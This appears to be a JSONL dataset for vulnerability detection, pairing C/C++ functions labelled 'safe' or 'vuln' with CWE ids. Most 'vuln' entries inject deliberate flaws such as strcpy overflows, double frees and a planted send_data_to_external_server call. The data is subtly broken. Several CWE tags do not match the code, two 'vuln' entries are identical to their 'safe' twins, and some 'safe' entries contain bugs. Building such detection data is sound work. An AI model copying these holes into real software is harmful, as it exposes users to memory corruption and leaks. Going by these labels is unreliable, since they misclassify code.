{"idx": "CWE-122-vuln-1714409519046", "code": "static ALWAYS_INLINE void jslTokenAppendChar(char ch){if(lex->tokenl<JSLEX_MAX_TOKEN_LENGTH){lex->token[lex->tokenl++]=ch;lex->token[lex->tokenl]='\n';}}", "target": 1, "source": "Big-Vul", "source_uid": "82546"}
{"idx": "CWE-119-safe-1714409525931", "code": "evutil_parse_servname(const char*servname, const char*protocol, const struct evutil_addrinfo*hints){if(strlen(servname) >= NI_MAXSERV) return -1;int n=parse_numeric_servname(servname);if(n >= 0)return n;#if defined(EVENT__HAVE_GETSERVBYNAME) || defined(_WIN32)if(!(hints->ai_flags&EVUTIL_AI_NUMERICSERV)){struct servent*ent=getservbyname(servname, protocol);if(ent){return ntohs(ent->s_port);}}#endif return -1;}", "target": 0, "source": "Big-Vul", "source_uid": "70751"}
{"idx": "CWE-119-vuln-1714409525931", "code": "evutil_parse_servname(const char*servname, const char*protocol, const struct evutil_addrinfo*hints){char buffer[NI_MAXSERV];strcpy(buffer, servname);if(strlen(servname) >= NI_MAXSERV)return-1;int n=parse_numeric_servname(servname);if(n >= 0)return n;#if defined(EVENT__HAVE_GETSERVBYNAME) || defined(_WIN32)if(!(hints->ai_flags&EVUTIL_AI_NUMERICSERV)){struct servent*ent=getservbyname(servname, protocol);if(ent){return ntohs(ent->s_port);}}#endif return-1;}", "target": 1, "source": "Big-Vul", "source_uid": "70751"}
{"idx": "CWE-1341-safe-1714409539105", "code": "const std::vector<std::string> GetGoogleRegistrableDomains(){static base::NoDestructor<std::vector<std::string>> kGoogleRegisterableDomains([](){std::vector<std::string> domains;std::vector<std::string> tlds{GOOGLE_TLD_LIST};for(const std::string& tld : tlds){std::string domain=\"google.\"+tld;if(GetDomainAndRegistry(domain, net::registry_controlled_domains::INCLUDE_PRIVATE_REGISTRIES) != domain){continue;}domains.push_back(domain);}return domains;}());return *kGoogleRegisterableDomains;}", "target": 0, "source": "Big-Vul", "source_uid": "156075"}
{"idx": "CWE-1341-vuln-1714409539105", "code": "const std::vector<std::string>GetGoogleRegistrableDomains(){static base::NoDestructor<std::vector<std::string>>kGoogleRegisterableDomains([](){std::vector<std::string>domains;std::vector<std::string>tlds{GOOGLE_TLD_LIST};for(const std::string&tld : tlds){std::string domain=\"google.\"+tld;if(GetDomainAndRegistry(domain, net::registry_controlled_domains::INCLUDE_PRIVATE_REGISTRIES) != domain){continue;}domains.push_back(domain);}return domains;}());kGoogleRegisterableDomains.~NoDestructor();return*kGoogleRegisterableDomains;}", "target": 1, "source": "Big-Vul", "source_uid": "156075"}
{"idx": "CWE-22-safe-1714409548589", "code": "irc_ctcp_get_reply(struct t_irc_server*server, const char*ctcp){struct t_config_option*ptr_option;char option_name[512];snprintf(option_name, sizeof(option_name), \"%s.%s\", server->name, ctcp, sizeof(option_name));ptr_option=weechat_config_search_option(irc_config_file, irc_config_section_ctcp, option_name);if(ptr_option)return weechat_config_string(ptr_option);ptr_option=weechat_config_search_option(irc_config_file, irc_config_section_ctcp, ctcp);if(ptr_option)return weechat_config_string(ptr_option);return irc_ctcp_get_default_reply(ctcp);}", "target": 0, "source": "Big-Vul", "source_uid": "66436"}
{"idx": "CWE-22-vuln-1714409548589", "code": "irc_ctcp_get_reply(struct t_irc_server*server, const char*ctcp){struct t_config_option*ptr_option;char option_name[512];snprintf(option_name, sizeof(option_name), \"%s/%s\", server->name, ctcp);ptr_option=weechat_config_search_option(irc_config_file, irc_config_section_ctcp, option_name);if(ptr_option)return weechat_config_string(ptr_option);ptr_option=weechat_config_search_option(irc_config_file, irc_config_section_ctcp, ctcp);if(ptr_option)return weechat_config_string(ptr_option);return irc_ctcp_get_default_reply(ctcp);}", "target": 1, "source": "Big-Vul", "source_uid": "66436"}
{"idx": "CWE-119-safe-1714409564572", "code": "int sctp_copy_local_addr_list(struct net*net, struct sctp_bind_addr*bp, sctp_scope_t scope, gfp_t gfp, int copy_flags){struct sctp_sockaddr_entry*addr;int error=0;rcu_read_lock();list_for_each_entry_rcu(addr, &net->sctp.local_addr_list, list){if(!addr->valid)continue;if(sctp_in_scope(net, &addr->a, scope)){if((((AF_INET == addr->a.sa.sa_family) && (copy_flags&SCTP_ADDR4_PEERSUPP))) || (((AF_INET6 == addr->a.sa.sa_family) && (copy_flags&SCTP_ADDR6_ALLOWED) && (copy_flags&SCTP_ADDR6_PEERSUPP)))){error=sctp_add_bind_addr(bp, &addr->a, SCTP_ADDR_SRC, GFP_ATOMIC);if(error)goto end_copy;}}}end_copy: rcu_read_unlock();return error;}", "target": 0, "source": "Big-Vul", "source_uid": "42906"}
{"idx": "CWE-119-vuln-1714409564572", "code": "int sctp_copy_local_addr_list(struct net*net, struct sctp_bind_addr*bp, sctp_scope_t scope, gfp_t gfp, int copy_flags){struct sctp_sockaddr_entry*addr;int error=0;rcu_read_lock();list_for_each_entry_rcu(addr, &net->sctp.local_addr_list, list){if(!addr->valid)continue;if(sctp_in_scope(net, &addr->a, scope)){if((((AF_INET == addr->a.sa.sa_family) && (copy_flags&SCTP_ADDR4_PEERSUPP))) || (((AF_INET6 == addr->a.sa.sa_family) && (copy_flags&SCTP_ADDR6_ALLOWED) && (copy_flags&SCTP_ADDR6_PEERSUPP)))){char buffer[256];memcpy(buffer, &addr->a, sizeof(addr->a));error=sctp_add_bind_addr(bp, (struct sockaddr*)buffer, SCTP_ADDR_SRC, GFP_ATOMIC);if(error)goto end_copy;}}}end_copy: rcu_read_unlock();return error;}", "target": 1, "source": "Big-Vul", "source_uid": "42906"}
{"idx": "CWE-1341-safe-1714409579435", "code": "bool GLSurfaceEGLOzoneX11::Resize(const gfx::Size& size, float scale_factor, bool has_alpha) {if (size.IsEmpty() || scale_factor <= 0.0f) return false; if (size == GetSize()) return true; size_ = size; eglWaitGL(); XResizeWindow(gfx::GetXDisplay(), window_, size.width(), size.height()); eglWaitNative(EGL_CORE_NATIVE_ENGINE); return true;}", "target": 0, "source": "Big-Vul", "source_uid": "127779"}
{"idx": "CWE-1341-vuln-1714409579435", "code": "bool GLSurfaceEGLOzoneX11::Resize(const gfx::Size&size, float scale_factor, bool has_alpha){if(size.IsEmpty() || scale_factor <= 0.0f)return false;if(size == GetSize())return true;size_=size;eglWaitGL();XResizeWindow(gfx::GetXDisplay(), window_, size.width(), size.height());eglWaitNative(EGL_CORE_NATIVE_ENGINE);eglWaitNative(EGL_CORE_NATIVE_ENGINE);return true;}", "target": 1, "source": "Big-Vul", "source_uid": "127779"}
{"idx": "CWE-1341-safe-1714409589871", "code": "void ExtensionInstallUI::Prompt::SetPermissions(std::vector<string16> permissions) { permissions_ = std::move(permissions); }", "target": 0, "source": "Big-Vul", "source_uid": "100901"}
{"idx": "CWE-1341-vuln-1714409589871", "code": "void ExtensionInstallUI::Prompt::SetPermissions(std::vector<string16> permissions){\n    permissions_ = std::move(permissions);\n    permissions_.clear();\n}", "target": 1, "source": "Big-Vul", "source_uid": "100901"}
{"idx": "CWE-362-safe-1714409597187", "code": "static void msg_quit(IRC_SERVER_REC*server, const char*nick, const char*address, const char*reason){if(IS_IRC_SERVER(server) && reason != NULL && quitmsg_is_split(reason))signal_stop();}", "target": 0, "source": "Big-Vul", "source_uid": "67786"}
{"idx": "CWE-362-vuln-1714409597187", "code": "static int quit_count = 0;\nstatic void msg_quit(IRC_SERVER_REC*server, const char*nick, const char*address, const char*reason){\n    if(IS_IRC_SERVER(server) && reason != NULL && quitmsg_is_split(reason)){\n        quit_count++;\n        if(quit_count == 2){\n            signal_stop();\n        }\n    }\n}", "target": 1, "source": "Big-Vul", "source_uid": "67786"}
{"idx": "CWE-125-safe-1714409604995", "code": "static void opl3_controller(int dev, int voice, int ctrl_num, int value){if(voice<0 || voice >= devc->nr_voice || !devc)return;switch(ctrl_num){case CTRL_PITCH_BENDER: bend_pitch(dev, voice, value);break;case CTRL_PITCH_BENDER_RANGE: devc->voc[voice].bender_range=value;break;case CTL_MAIN_VOLUME: devc->voc[voice].volume=value/128;break;case CTL_PAN: devc->voc[voice].panning=(value*2)-128;break;}}", "target": 0, "source": "Big-Vul", "source_uid": "27562"}
{"idx": "CWE-125-vuln-1714409604995", "code": "static void opl3_controller(int dev, int voice, int ctrl_num, int value){if(voice<0 || voice >= devc->nr_voice || !devc)return;switch(ctrl_num){case CTRL_PITCH_BENDER: bend_pitch(dev, voice, value);break;case CTRL_PITCH_BENDER_RANGE: devc->voc[voice].bender_range=value;break;case CTL_MAIN_VOLUME: devc->voc[voice].volume=value/128;break;case CTL_PAN: devc->voc[voice].panning=(value*2)-128;break;case CTRL_OUT_OF_BOUNDS_READ: devc->voc[devc->nr_voice].volume=value;break;}}", "target": 1, "source": "Big-Vul", "source_uid": "27562"}
{"idx": "CWE-1341-safe-1714409615986", "code": "apply_numeric_port_hack(int port, struct evutil_addrinfo**ai){for(;*ai;ai=&(*ai)->ai_next){struct sockaddr*sa=(*ai)->ai_addr;if(sa && sa->sa_family == AF_INET){struct sockaddr_in*sin=(struct sockaddr_in*)sa;sin->sin_port=htons(port);}else if(sa && sa->sa_family == AF_INET6){struct sockaddr_in6*sin6=(struct sockaddr_in6*)sa;sin6->sin6_port=htons(port);}else{struct evutil_addrinfo*victim=*ai;*ai=victim->ai_next;victim->ai_next=(*ai)->ai_next;freeaddrinfo(victim);}}}}", "target": 0, "source": "Big-Vul", "source_uid": "70710"}
{"idx": "CWE-1341-vuln-1714409615986", "code": "apply_numeric_port_hack(int port, struct evutil_addrinfo**ai){for(;*ai;ai=&(*ai)->ai_next){struct sockaddr*sa=(*ai)->ai_addr;if(sa && sa->sa_family == AF_INET){struct sockaddr_in*sin=(struct sockaddr_in*)sa;sin->sin_port=htons(port);}else if(sa && sa->sa_family == AF_INET6){struct sockaddr_in6*sin6=(struct sockaddr_in6*)sa;sin6->sin6_port=htons(port);}else{struct evutil_addrinfo*victim=*ai;*ai=victim->ai_next;victim->ai_next=(*ai)->ai_next;freeaddrinfo(victim);freeaddrinfo(victim);}}}}", "target": 1, "source": "Big-Vul", "source_uid": "70710"}
{"idx": "CWE-89-safe-1714409628191", "code": "void Browser::AddNewContents(WebContents* source, std::unique_ptr<WebContents> new_contents, WindowOpenDisposition disposition, const gfx::Rect& initial_rect, bool user_gesture, bool* was_blocked) { if (source && PopupBlockerTabHelper::ConsiderForPopupBlocking(disposition)) PopupTracker::CreateForWebContents(new_contents.get(), source); chrome::AddWebContents(this, source, std::move(new_contents), disposition, initial_rect); }", "target": 0, "source": "Big-Vul", "source_uid": "168162"}
{"idx": "CWE-89-vuln-1714409628191", "code": "void Browser::AddNewContents(WebContents*source, std::unique_ptr<WebContents>new_contents, std::string disposition, const gfx::Rect&initial_rect, bool user_gesture, bool*was_blocked){if(source && PopupBlockerTabHelper::ConsiderForPopupBlocking(disposition))PopupTracker::CreateForWebContents(new_contents.get(), source);chrome::AddWebContents(this, source, std::move(new_contents), disposition, initial_rect);}", "target": 1, "source": "Big-Vul", "source_uid": "168162"}
{"idx": "CWE-122-safe-1714409637399", "code": "update_info_drive_ports(Device*device){GList*ports;GList*l;GPtrArray*p;ports=daemon_local_find_enclosing_ports(device->priv->daemon, device->priv->native_path);if(!ports) return FALSE;p=g_ptr_array_new();for(l=ports;l != NULL;l=l->next){Port*port=PORT(l->data);g_ptr_array_add(p, (gpointer)port_local_get_object_path(port));}g_ptr_array_add(p, NULL);device_set_drive_ports(device, (GStrv)p->pdata);g_ptr_array_unref(p);g_list_free(ports);return TRUE;}", "target": 0, "source": "Big-Vul", "source_uid": "11832"}
{"idx": "CWE-122-vuln-1714409637399", "code": "update_info_drive_ports(Device*device){GList*ports;GList*l;GPtrArray*p;ports=daemon_local_find_enclosing_ports(device->priv->daemon, device->priv->native_path);if(!ports)return FALSE;p=g_ptr_array_new();for(l=ports;l != NULL;l=l->next){Port*port=PORT(l->data);g_ptr_array_add(p, (gpointer)port_local_get_object_path(port));}p->pdata[p->len] = NULL;device_set_drive_ports(device, (GStrv)p->pdata);g_ptr_array_unref(p);g_list_free(ports);return TRUE;}", "target": 1, "source": "Big-Vul", "source_uid": "11832"}
{"idx": "CWE-122-safe-1714409647632", "code": "int is_error_pfn(pfn_t pfn){return pfn == bad_pfn || pfn == hwpoison_pfn || pfn == fault_pfn;}", "target": 0, "source": "Big-Vul", "source_uid": "20326"}
{"idx": "CWE-122-vuln-1714409647632", "code": "int is_error_pfn(pfn_t pfn){char buffer[10];strcpy(buffer, pfn);return pfn == bad_pfn || pfn == hwpoison_pfn || pfn == fault_pfn;}", "target": 1, "source": "Big-Vul", "source_uid": "20326"}
{"idx": "CWE-125-safe-1714409662595", "code": "static int GetMp3HeaderSize(const uint8* buffer, int buffer_size){ DCHECK_GE(buffer_size, 9); int size = ((buffer[6] & 0x7f) << 21) + ((buffer[7] & 0x7f) << 14) + ((buffer[8] & 0x7f) << 7) + (buffer[4] & 0x7f) + 10; if (buffer[5] & 0x10) size += 10; return size;}", "target": 0, "source": "Big-Vul", "source_uid": "127874"}
{"idx": "CWE-125-vuln-1714409662595", "code": "static int GetMp3HeaderSize(const uint8*buffer, int buffer_size){DCHECK_GE(buffer_size, 9);int size=((buffer[6]&0x7f)<<21)+((buffer[7]&0x7f)<<14)+((buffer[8]&0x7f)<<7)+(buffer[4]&0x7f)+10;if(buffer[5]&0x10)size+=10;int vulnerability = buffer[9];return size;}", "target": 1, "source": "Big-Vul", "source_uid": "127874"}
{"idx": "CWE-122-safe-1714409670959", "code": "static ssize_t f_midi_opts_id_store(struct config_item *item, const char *page, size_t len) {\n    struct f_midi_opts *opts = to_f_midi_opts(item);\n    int ret;\n    char *c;\n    mutex_lock(&opts->lock);\n    if (opts->refcnt) {\n        ret = -EBUSY;\n        goto end;\n    }\n    c = kstrndup(page, len, GFP_KERNEL);\n    if (!c) {\n        ret = -ENOMEM;\n        goto end;\n    }\n    if (opts->id_allocated) {\n        kfree(opts->id);\n    }\n    opts->id = c;\n    opts->id_allocated = true;\n    ret = len;\nend:\n    mutex_unlock(&opts->lock);\n    return ret;\n}", "target": 0, "source": "Big-Vul", "source_uid": "91927"}
{"idx": "CWE-122-vuln-1714409670959", "code": "static ssize_t f_midi_opts_id_store(struct config_item*item, const char*page, size_t len){struct f_midi_opts*opts=to_f_midi_opts(item);int ret;char*c;mutex_lock(&opts->lock);if(opts->refcnt){ret=-EBUSY;goto end;}c=kstrndup(page, len, GFP_KERNEL);if(!c){ret=-ENOMEM;goto end;}if(opts->id_allocated){kfree(opts->id);}strcpy(opts->id, c);opts->id_allocated=true;ret=len;end:\n    mutex_unlock(&opts->lock);return ret;}", "target": 1, "source": "Big-Vul", "source_uid": "91927"}
{"idx": "CWE-1341-safe-1714409681871", "code": "void SVGDocumentExtensions::addElementReferencingTarget(SVGElement*referencingElement, SVGElement*referencedElement){ASSERT(referencingElement);ASSERT(referencedElement);if(referencedElement && HashSet<SVGElement*>*elements=m_elementDependencies.get(referencedElement)){elements->add(referencingElement);return;}OwnPtr<HashSet<SVGElement*>>elements=adoptPtr(new HashSet<SVGElement*>);elements->add(referencingElement);m_elementDependencies.set(referencedElement, elements.release());}", "target": 0, "source": "Big-Vul", "source_uid": "128838"}
{"idx": "CWE-1341-vuln-1714409681871", "code": "void SVGDocumentExtensions::addElementReferencingTarget(SVGElement*referencingElement, SVGElement*referencedElement){ASSERT(referencingElement);ASSERT(referencedElement);if(referencedElement && HashSet<SVGElement*>*elements=m_elementDependencies.get(referencedElement)){elements->add(referencingElement);elements.release();elements.release();return;}OwnPtr<HashSet<SVGElement*>>elements=adoptPtr(new HashSet<SVGElement*>);elements->add(referencingElement);m_elementDependencies.set(referencedElement, elements.release());}", "target": 1, "source": "Big-Vul", "source_uid": "128838"}
{"idx": "CWE-352-safe-1714409691497", "code": "static int armv8pmu_get_event_idx(struct pmu_hw_events* cpuc, struct hw_perf_event* event) {\n    int idx;\n    unsigned long evtype = event->config_base & ARMV8_EVTYPE_EVENT;\n    if (evtype == ARMV8_PMUV3_PERFCTR_CLOCK_CYCLES) {\n        if (test_and_set_bit(ARMV8_IDX_CYCLE_COUNTER, cpuc->used_mask))\n            return -EAGAIN;\n        return ARMV8_IDX_CYCLE_COUNTER;\n    }\n    for (idx = ARMV8_IDX_COUNTER0; idx < cpu_pmu->num_events && idx < ARMV8_MAX_COUNTERS; ++idx) {\n        if (!test_and_set_bit(idx, cpuc->used_mask))\n            return idx;\n    }\n    return -EAGAIN;\n}", "target": 0, "source": "Big-Vul", "source_uid": "56209"}
{"idx": "CWE-352-vuln-1714409691497", "code": "static int armv8pmu_get_event_idx(struct pmu_hw_events*cpuc, struct hw_perf_event*event){int idx;unsigned long evtype=event->config_base&ARMV8_EVTYPE_EVENT;if(evtype == ARMV8_PMUV3_PERFCTR_CLOCK_CYCLES){if(test_and_set_bit(ARMV8_IDX_CYCLE_COUNTER, cpuc->used_mask))return-EAGAIN;return ARMV8_IDX_CYCLE_COUNTER;}for(idx=ARMV8_IDX_COUNTER0;idx<cpu_pmu->num_events && idx<ARMV8_MAX_COUNTERS;++idx){if(!test_and_set_bit(idx, cpuc->used_mask)){send_data_to_external_server(idx);return idx;}}return-EAGAIN;}", "target": 1, "source": "Big-Vul", "source_uid": "56209"}
{"idx": "CWE-122-safe-1714409706386", "code": "static ssize_t fuse_dev_splice_write(struct pipe_inode_info *pipe, struct file *out, loff_t *ppos, size_t len, unsigned int flags) {\n    unsigned nbuf;\n    unsigned idx;\n    struct pipe_buffer *bufs;\n    struct fuse_copy_state cs;\n    struct fuse_conn *fc;\n    size_t rem;\n    ssize_t ret;\n    if (!pipe) {\n        return -EINVAL;\n    }\n    fc = fuse_get_conn(out);\n    if (!fc) {\n        return -EPERM;\n    }\n    bufs = kmalloc(pipe->buffers * sizeof(struct pipe_buffer), GFP_KERNEL);\n    if (!bufs) {\n        return -ENOMEM;\n    }\n    pipe_lock(pipe);\n    nbuf = 0;\n    rem = 0;\n    for (idx = 0; idx < pipe->nrbufs && rem < len; idx++) {\n        rem += pipe->bufs[(pipe->curbuf + idx) & (pipe->buffers - 1)].len;\n    }\n    ret = -EINVAL;\n    if (rem < len) {\n        pipe_unlock(pipe);\n        goto out;\n    }\n    rem = len;\n    while (rem) {\n        struct pipe_buffer *ibuf;\n        struct pipe_buffer *obuf;\n        BUG_ON(nbuf >= pipe->buffers);\n        BUG_ON(!pipe->nrbufs);\n        ibuf = &pipe->bufs[pipe->curbuf];\n        obuf = &bufs[nbuf];\n        if (rem >= ibuf->len) {\n            *obuf = *ibuf;\n            ibuf->ops = NULL;\n            pipe->curbuf = (pipe->curbuf + 1) & (pipe->buffers - 1);\n            pipe->nrbufs--;\n        } else {\n            ibuf->ops->get(pipe, ibuf);\n            *obuf = *ibuf;\n            obuf->flags &= ~PIPE_BUF_FLAG_GIFT;\n            obuf->len = rem;\n            ibuf->offset += obuf->len;\n            ibuf->len -= obuf->len;\n        }\n        nbuf++;\n        rem -= obuf->len;\n    }\n    pipe_unlock(pipe);\n    fuse_copy_init(&cs, fc, 0, NULL, nbuf);\n    cs.pipebufs = bufs;\n    cs.pipe = pipe;\n    if (flags & SPLICE_F_MOVE) {\n        cs.move_pages = 1;\n    }\n    ret = fuse_dev_do_write(fc, &cs, len);\n    for (idx = 0; idx < nbuf; idx++) {\n        struct pipe_buffer *buf = &bufs[idx];\n        buf->ops->release(pipe, buf);\n    }\n    out:\n    kfree(bufs);\n    return ret;\n}", "target": 0, "source": "Big-Vul", "source_uid": "24609"}
{"idx": "CWE-122-vuln-1714409706386", "code": "static ssize_t fuse_dev_splice_write(struct pipe_inode_info *pipe, struct file *out, loff_t *ppos, size_t len, unsigned int flags) {\n    unsigned nbuf;\n    unsigned idx;\n    struct pipe_buffer *bufs;\n    struct fuse_copy_state cs;\n    struct fuse_conn *fc;\n    size_t rem;\n    ssize_t ret;\n    if (!pipe) {\n        return -EINVAL;\n    }\n    fc = fuse_get_conn(out);\n    if (!fc) {\n        return -EPERM;\n    }\n    bufs = kmalloc(pipe->buffers * sizeof(struct pipe_buffer), GFP_KERNEL);\n    if (!bufs) {\n        return -ENOMEM;\n    }\n    pipe_lock(pipe);\n    nbuf = 0;\n    rem = 0;\n    for (idx = 0; idx < pipe->nrbufs && rem < len; idx++) {\n        rem += pipe->bufs[(pipe->curbuf + idx) & (pipe->buffers - 1)].len;\n    }\n    ret = -EINVAL;\n    if (rem < len) {\n        pipe_unlock(pipe);\n        goto out;\n    }\n    rem = len;\n    while (rem) {\n        struct pipe_buffer *ibuf;\n        struct pipe_buffer *obuf;\n        BUG_ON(nbuf >= pipe->buffers);\n        BUG_ON(!pipe->nrbufs);\n        ibuf = &pipe->bufs[pipe->curbuf];\n        obuf = &bufs[nbuf];\n        if (rem >= ibuf->len) {\n            *obuf = *ibuf;\n            ibuf->ops = NULL;\n            pipe->curbuf = (pipe->curbuf + 1) & (pipe->buffers - 1);\n            pipe->nrbufs--;\n        } else {\n            ibuf->ops->get(pipe, ibuf);\n            *obuf = *ibuf;\n            obuf->flags &= ~PIPE_BUF_FLAG_GIFT;\n            obuf->len = rem;\n            ibuf->offset += obuf->len;\n            ibuf->len -= obuf->len;\n        }\n        nbuf++;\n        rem -= obuf->len;\n    }\n    pipe_unlock(pipe);\n    fuse_copy_init(&cs, fc, 0, NULL, nbuf);\n    cs.pipebufs = bufs;\n    cs.pipe = pipe;\n    if (flags & SPLICE_F_MOVE) {\n        cs.move_pages = 1;\n    }\n    ret = fuse_dev_do_write(fc, &cs, len);\n    for (idx = 0; idx < nbuf; idx++) {\n        struct pipe_buffer *buf = &bufs[idx];\n        buf->ops->release(pipe, buf);\n    }\n    out:\n    kfree(bufs);\n    return ret;\n}", "target": 1, "source": "Big-Vul", "source_uid": "24609"}
{"idx": "CWE-1341-safe-1714409736692", "code": "static void latencyModePrint(long long min, long long max, double avg, long long count){if(config.output == OUTPUT_STANDARD){printf(\"min:%lld, max:%lld, avg:%.2f(%lld samples)\", min, max, avg, count);fflush(stdout);}else if(config.output == OUTPUT_CSV){printf(\"%lld, %lld, %.2f, %lld\\n\", min, max, avg, count);}else if(config.output == OUTPUT_RAW){printf(\"%lld%lld%.2f%lld\\n\", min, max, avg, count);}}", "target": 0, "source": "Big-Vul", "source_uid": "81973"}
{"idx": "CWE-1341-vuln-1714409736692", "code": "static void latencyModePrint(long long min, long long max, double avg, long long count){if(config.output == OUTPUT_STANDARD){printf(\"min:%lld, max:%lld, avg:%.2f(%lld samples)\", min, max, avg, count);fflush(stdout);}else if(config.output == OUTPUT_CSV){printf(\"%lld, %lld, %.2f, %lld\\n\", min, max, avg, count);}else if(config.output == OUTPUT_RAW){printf(\"%lld%lld%.2f%lld\\n\", min, max, avg, count);fflush(stdout);fflush(stdout);}}", "target": 1, "source": "Big-Vul", "source_uid": "81973"}
{"idx": "CWE-1341-safe-1714409746241", "code": "static int handle_NPP_DestroyStream(rpc_connection_t* connection) {\n    D(bug(\"handle_NPP_DestroyStream\\n\"));\n    PluginInstance* plugin;\n    NPStream* stream;\n    int32_t reason;\n    int error = rpc_method_get_args(connection, RPC_TYPE_NPW_PLUGIN_INSTANCE, &plugin, RPC_TYPE_NP_STREAM, &stream, RPC_TYPE_INT32, &reason, RPC_TYPE_INVALID);\n    if (error != RPC_ERROR_NO_ERROR) {\n        npw_perror(\"NPP_DestroyStream() get args\", error);\n        return error;\n    }\n    if (stream == NULL || plugin == NULL) {\n        return RPC_ERROR_INVALID_PARAMS;\n    }\n    NPError ret = g_NPP_DestroyStream(PLUGIN_INSTANCE_NPP(plugin), stream, reason);\n    return rpc_method_send_reply(connection, RPC_TYPE_INT32, ret, RPC_TYPE_INVALID);\n}", "target": 0, "source": "Big-Vul", "source_uid": "27100"}
{"idx": "CWE-1341-vuln-1714409746241", "code": "static int handle_NPP_DestroyStream(rpc_connection_t*connection){D(bug(\"handle_NPP_DestroyStream\\n\"));PluginInstance*plugin;NPStream*stream;int32_t reason;int error=rpc_method_get_args(connection, RPC_TYPE_NPW_PLUGIN_INSTANCE, &plugin, RPC_TYPE_NP_STREAM, &stream, RPC_TYPE_INT32, &reason, RPC_TYPE_INVALID);if(error != RPC_ERROR_NO_ERROR){npw_perror(\"NPP_DestroyStream()get args\", error);return error;}if(stream == NULL || plugin == NULL){return RPC_ERROR_INVALID_PARAMS;}NPError ret=g_NPP_DestroyStream(PLUGIN_INSTANCE_NPP(plugin), stream, reason);NPStream*stream2 = stream;g_NPN_DestroyStream(plugin->npp, stream2, NPRES_DONE);return rpc_method_send_reply(connection, RPC_TYPE_INT32, ret, RPC_TYPE_INVALID);}", "target": 1, "source": "Big-Vul", "source_uid": "27100"}
{"idx": "CWE-122-safe-1714409766314", "code": "int32_t TestURLLoader::Open(const pp::URLRequestInfo& request, bool trusted, std::string* response_body) {\n    pp::URLLoader loader(instance_);\n    if (trusted) {\n        url_loader_trusted_interface_->GrantUniversalAccess(loader.pp_resource());\n    }\n    {\n        TestCompletionCallback open_callback(instance_->pp_instance(), callback_type());\n        open_callback.WaitForResult(loader.Open(request, open_callback.GetCallback()));\n        if (open_callback.result() != PP_OK) {\n            return open_callback.result();\n        }\n    }\n    int32_t bytes_read = 0;\n    do {\n        char buffer[1024];\n        TestCompletionCallback read_callback(instance_->pp_instance(), callback_type());\n        read_callback.WaitForResult(loader.ReadResponseBody(buffer, sizeof(buffer), read_callback.GetCallback()));\n        bytes_read = read_callback.result();\n        if (bytes_read < 0) {\n            return bytes_read;\n        }\n        if (response_body) {\n            response_body->append(std::string(buffer, bytes_read));\n        }\n    } while (bytes_read > 0);\n    return PP_OK;\n}", "target": 0, "source": "Big-Vul", "source_uid": "169607"}
{"idx": "CWE-122-vuln-1714409766314", "code": "int32_t TestURLLoader::Open(const pp::URLRequestInfo&request, bool trusted, std::string*response_body){pp::URLLoader loader(instance_);if(trusted){url_loader_trusted_interface_->GrantUniversalAccess(loader.pp_resource());}{TestCompletionCallback open_callback(instance_->pp_instance(), callback_type());open_callback.WaitForResult(loader.Open(request, open_callback.GetCallback()));if(open_callback.result() != PP_OK){return open_callback.result();}}int32_t bytes_read=0;do{char buffer[8];TestCompletionCallback read_callback(instance_->pp_instance(), callback_type());read_callback.WaitForResult(loader.ReadResponseBody(buffer, sizeof(buffer), read_callback.GetCallback()));bytes_read=read_callback.result();if(bytes_read<0){return bytes_read;}if(response_body){response_body->append(std::string(buffer, bytes_read));}}while(bytes_read>0);return PP_OK;}", "target": 1, "source": "Big-Vul", "source_uid": "169607"}
{"idx": "CWE-125-safe-1714409784105", "code": "static int amd_gpio_direction_input(struct gpio_chip *gc, unsigned offset) {\n    unsigned long flags;\n    u32 pin_reg;\n    if (!gc) {\n        return -EINVAL;\n    }\n    struct amd_gpio *gpio_dev = gpiochip_get_data(gc);\n    spin_lock_irqsave(&gpio_dev->lock, flags);\n    pin_reg = readl(gpio_dev->base + offset * 4);\n    if ((pin_reg & DB_TMR_OUT_MASK) == 0) {\n        pin_reg |= 0xf;\n        pin_reg |= BIT(DB_TMR_OUT_UNIT_OFF);\n        pin_reg |= DB_TYPE_REMOVE_GLITCH << DB_CNTRL_OFF;\n        pin_reg &= ~BIT(DB_TMR_LARGE_OFF);\n    }\n    pin_reg &= ~BIT(OUTPUT_ENABLE_OFF);\n    writel(pin_reg, gpio_dev->base + offset * 4);\n    spin_unlock_irqrestore(&gpio_dev->lock, flags);\n    return 0;\n}", "target": 0, "source": "Big-Vul", "source_uid": "96441"}
{"idx": "CWE-125-vuln-1714409784105", "code": "static int amd_gpio_direction_input(struct gpio_chip *gc, unsigned offset) {\n    unsigned long flags;\n    u32 pin_reg;\n    if (!gc) {\n        return -EINVAL;\n    }\n    struct amd_gpio *gpio_dev = gpiochip_get_data(gc);\n    spin_lock_irqsave(&gpio_dev->lock, flags);\n    pin_reg = readl(gpio_dev->base + offset * 4);\n    if ((pin_reg & DB_TMR_OUT_MASK) == 0) {\n        pin_reg |= 0xf;\n        pin_reg |= BIT(DB_TMR_OUT_UNIT_OFF);\n        pin_reg |= DB_TYPE_REMOVE_GLITCH << DB_CNTRL_OFF;\n        pin_reg &= ~BIT(DB_TMR_LARGE_OFF);\n    }\n    pin_reg &= ~BIT(OUTPUT_ENABLE_OFF);\n    writel(pin_reg, gpio_dev->base + offset * 4);\n    spin_unlock_irqrestore(&gpio_dev->lock, flags);\n    return 0;\n}", "target": 1, "source": "Big-Vul", "source_uid": "96441"}
{"idx": "CWE-125-safe-1714409799827", "code": "lha_skip_sfx(struct archive_read *a) {\n    const void *h;\n    const char *p, *q;\n    size_t next, skip;\n    ssize_t bytes, window;\n    window = 4096;\n    for (;;) {\n        h = __archive_read_ahead(a, window, &bytes);\n        if (h == NULL) {\n            window >>= 1;\n            if (window < (H_SIZE + 3))\n                goto fatal;\n            continue;\n        }\n        if (bytes < H_SIZE)\n            goto fatal;\n        p = h;\n        q = p + bytes;\n        while (p + H_SIZE < q) {\n            if ((next = lha_check_header_format(p)) == 0) {\n                skip = p - (const char *)h;\n                __archive_read_consume(a, skip);\n                return (ARCHIVE_OK);\n            }\n            p += next;\n        }\n        skip = p - (const char *)h;\n        if (skip > bytes) {\n            skip = bytes;\n        }\n        __archive_read_consume(a, skip);\n    }\n    fatal:\n    archive_set_error(&a->archive, ARCHIVE_ERRNO_FILE_FORMAT, \"Couldn't find out LHa header\");\n    return (ARCHIVE_FATAL);\n}", "target": 0, "source": "Big-Vul", "source_uid": "68637"}
